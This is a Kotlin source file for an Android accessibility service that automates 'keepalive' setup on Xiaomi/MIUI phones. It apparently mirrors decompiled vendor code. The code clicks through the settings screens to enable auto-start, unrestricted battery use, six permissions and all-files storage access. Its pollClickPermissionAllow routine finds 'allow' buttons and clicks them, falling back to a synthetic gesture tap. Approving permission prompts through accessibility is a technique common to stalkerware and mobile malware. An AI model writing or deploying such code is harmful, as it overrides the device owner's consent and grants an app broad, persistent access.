package com.storm.safe.rock.service.modules.yw5xud.miui

import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.VendorSteps
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger

/**
 * MiuiSteps — Xiaomi/MIUI-specific keepalive permission automation (orchestrator).
 * Matches vendor C0367a4 (a4, MiuiSteps). Key flows:
 *
 * 1. Auto-start management (自启动管理)          -> [MiuiAutoStart]
 * 2. Battery saver (省电策略)                     -> [MiuiPowerStrategy]
 * 3. Background popup (后台弹窗)                  -> [MiuiBatterySaver]
 * 4. Permission management (权限管理, 6 items)    -> [MiuiPermissionManagement]
 * 5. All files access (MANAGE_EXTERNAL_STORAGE)   -> [MiuiAllFilesAccess]
 *
 * Shared utilities (waitForPageStable, interruptibleDelay, findAndClickAppSwitch,
 * findAndClickText, handleConfirmPopupDialog, returnToHome, pollClickPermissionAllow)
 * remain here for delegate access via `steps` reference.
 *
 * Constants are in [MiuiConstants]. Phase 0 logic is in [MiuiBasicPerms].
 */
open class MiuiSteps(
    service: MyAccessibilityService?,
    context: Context,
    ui: UiAutomation = UiAutomation(service, context)
) : VendorSteps(service, context, ui) {
    override val tag = "MiuiSteps"

    companion object {
        private const val TAG = "MiuiSteps"
    }

    // ── Delegate instances (lazy to avoid circular init) ────────────────
    private val basicPermsDelegate by lazy { MiuiBasicPerms(service, context, ui, this) }
    private val autoStartDelegate by lazy { MiuiAutoStart(service, context, ui, this) }
    private val powerStrategyDelegate by lazy { MiuiPowerStrategy(service, context, ui, this) }
    private val batterySaverDelegate by lazy { MiuiBatterySaver(service, context, ui) }
    private val permissionMgmtDelegate by lazy { MiuiPermissionManagement(service, context, ui, this) }
    private val allFilesAccessDelegate by lazy { MiuiAllFilesAccess(service, context, ui, this) }

    /**
     * Main execution entry for MIUI-specific steps.
     * Vendor m212253b2: 5 phases -- basic permissions, battery, auto-start,
     * notification, background popup/overlay.
     */
    override suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("MiuiSteps: begin MIUI permission config")
        UiDebugger.logStep(TAG, "MiuiSteps.execute() begin", "brand=xiaomi")

        // Phase 0: Basic permissions
        basicPermsDelegate.execute(successes, failures, logs)

        // Phase 1: Auto-start management
        executeAutoStart(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(1500L)
        UiDebugger.dumpPage(service, "miui_phase1_app_detail", "app detail page opened")
        val autoStartKeywords = arrayOf("自启动", "自啟動")
        UiDebugger.dumpPage(service, "miui_phase1_find_switch", "searching auto-start switch")
        var found = false
        for (keyword in autoStartKeywords) {
            if (ui.openSwitch(keyword)) {
                handleConfirmPopupDialog()
                successes.add("auto-start switch clicked")
                found = true
                break
            }
        }
        if (!found) {
            Log.w(TAG, "[auto-start] switch not found")
        }
        interruptibleDelay(1000L)

        // Phase 2: Power strategy
        executePowerStrategy(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 3: Permission management -- 6 permissions in one flow
        executePermissionManagement(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 4: ALL_FILES (MANAGE_EXTERNAL_STORAGE)
        try {
            executeAllFilesAccess(successes, failures, logs)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[Phase4] executeAllFilesAccess exception: ${e.message}")
            failures.add("all_files_access: ${e.message}")
        }

        logs.add("MiuiSteps: MIUI permission config done")
    }

    // ── Delegate forwarding methods (preserve open/internal signatures for tests) ──

    /** Navigate to auto-start management. Delegates to [MiuiAutoStart]. */
    open fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = autoStartDelegate.execute(successes, failures, logs)

    /** Power strategy flow. Delegates to [MiuiPowerStrategy]. */
    open suspend fun executePowerStrategy(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = powerStrategyDelegate.execute(successes, failures, logs)

    /** Legacy battery saver. Delegates to [MiuiBatterySaver]. */
    fun executeBatterySaver(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = batterySaverDelegate.executeBatterySaver(successes, failures, logs)

    /** Legacy background popup. Delegates to [MiuiBatterySaver]. */
    open fun executeBackgroundPopup(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = batterySaverDelegate.executeBackgroundPopup(successes, failures, logs)

    /** Permission management -- 6 permissions. Delegates to [MiuiPermissionManagement]. */
    open suspend fun executePermissionManagement(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = permissionMgmtDelegate.execute(successes, failures, logs)

    /** ALL_FILES access. Delegates to [MiuiAllFilesAccess]. */
    @Suppress("DEPRECATION")
    open suspend fun executeAllFilesAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean = allFilesAccessDelegate.execute(successes, failures, logs)

    // ── Shared utilities (used by multiple delegates via `steps` reference) ──

    /**
     * Wait until accessibility root window node count stabilizes.
     * Matches vendor m212294f9 (waitForPageStable).
     */
    internal suspend fun waitForPageStable(
        requiredStableCount: Int = MiuiConstants.STABLE_REQUIRED_COUNT,
        pollIntervalMs: Long = MiuiConstants.STABLE_POLL_INTERVAL_MS,
        timeoutMs: Long = MiuiConstants.STABLE_TIMEOUT_MS
    ): Boolean {
        return ui.waitForPageStable(requiredStableCount, pollIntervalMs, timeoutMs)
    }

    /**
     * Delay in small chunks (100ms) to stay responsive to cancellation.
     * Matches vendor m212272d6 (interruptibleDelay).
     */
    internal open suspend fun interruptibleDelay(totalMs: Long) {
        ui.interruptibleDelay(totalMs)
    }

    /**
     * Find our app in a list and click its switch/toggle.
     * JADX: m212290f5 + m212249a3.
     */
    internal suspend fun findAndClickAppSwitch(keywords: List<String>): Boolean {
        try {
            if (appLabel.isNotEmpty() && ui.openSwitch(appLabel)) {
                Log.i(TAG, "[findAndClickAppSwitch] found by app label: $appLabel")
                return true
            }
            for (keyword in keywords) {
                if (ui.openSwitch(keyword)) {
                    Log.i(TAG, "[findAndClickAppSwitch] found by keyword: $keyword")
                    return true
                }
            }
            // Scroll and retry
            for (scrollAttempt in 0 until MiuiConstants.MAX_SCROLL_ATTEMPTS) {
                if (!ui.scrollForward()) break
                interruptibleDelay(500L)
                if (appLabel.isNotEmpty() && ui.openSwitch(appLabel)) return true
                for (keyword in keywords) {
                    if (ui.openSwitch(keyword)) return true
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[findAndClickAppSwitch] error: ${e.message}")
        }
        return false
    }

    /**
     * Find and click text directly (for radio buttons like "无限制").
     * Vendor m212248a1 (clickTextDirectly).
     */
    internal suspend fun findAndClickText(keywords: List<String>): Boolean {
        for (keyword in keywords) {
            if (ui.clickSelector("[text*=\"$keyword\"][visibleToUser=true]")) {
                Log.i(TAG, "[findAndClickText] clicked: $keyword")
                return true
            }
        }
        // Scroll and retry
        for (keyword in keywords) {
            if (ui.clickSelectorWithScroll("[text*=\"$keyword\"][visibleToUser=true]", MiuiConstants.MAX_SCROLL_ATTEMPTS)) {
                Log.i(TAG, "[findAndClickText] clicked after scroll: $keyword")
                return true
            }
        }
        return false
    }

    /**
     * Handle confirm popup dialog after toggling a switch.
     * Vendor m212283e8.
     */
    internal suspend fun handleConfirmPopupDialog(): Boolean {
        interruptibleDelay(500L)
        for (keyword in MiuiConstants.CONFIRM_KEYWORDS) {
            if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true][clickable=true]")) {
                Log.i(TAG, "[handleConfirmPopup] clicked: $keyword")
                return true
            }
        }
        return false
    }

    /**
     * Return to home screen. Vendor m212280e5: 3x BACK + 1x HOME + delay(1000ms).
     */
    internal suspend fun returnToHome() {
        try {
            repeat(3) {
                service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                interruptibleDelay(200L)
            }
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            interruptibleDelay(1000L)
        } catch (_: Exception) {}
    }

    /** Gesture tap at coordinates. Vendor m212277e2. */
    private fun gestureTap(x: Float, y: Float): Boolean {
        val svc = service ?: return false
        return try {
            val path = Path().apply {
                moveTo(x, y)
                lineTo(x + 1f, y + 1f)  // 1px jitter
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 50L))
                .build()
            svc.dispatchGesture(gesture, null, null)
            Thread.sleep(100L)
            true
        } catch (_: Exception) { false }
    }

    /** Gesture swipe. Vendor m212278e3. */
    private fun gestureSwipe(x1: Float, y1: Float, x2: Float, y2: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 10L, 300L))
                .build()
            service?.dispatchGesture(gesture, null, null)
            Thread.sleep(500L)
            true
        } catch (_: Exception) { false }
    }

    /**
     * Phase 0 self-polling: search for permission allow keywords and click.
     * Returns true if a click was performed.
     */
    internal fun pollClickPermissionAllow(root: AccessibilityNodeInfo): Boolean {
        for (keyword in MiuiConstants.PERMISSION_ALLOW_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
                // Prefer direct click on clickable node
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[Phase0] clicked allow: $keyword")
                    return true
                }
                // Walk up parents (3 levels)
                var parent = try { node.parent } catch (_: Exception) { null }
                for (depth in 0 until 3) {
                    if (parent == null) break
                    if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "[Phase0] clicked parent for: $keyword")
                        return true
                    }
                    parent = try { parent.parent } catch (_: Exception) { null }
                }
                // Gesture fallback
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() > 0 && rect.height() > 0) {
                    if (gestureTap(rect.centerX().toFloat(), rect.centerY().toFloat())) {
                        Log.i(TAG, "[Phase0] gesture tap for: $keyword")
                        return true
                    }
                }
            }
        }
        return false
    }
}
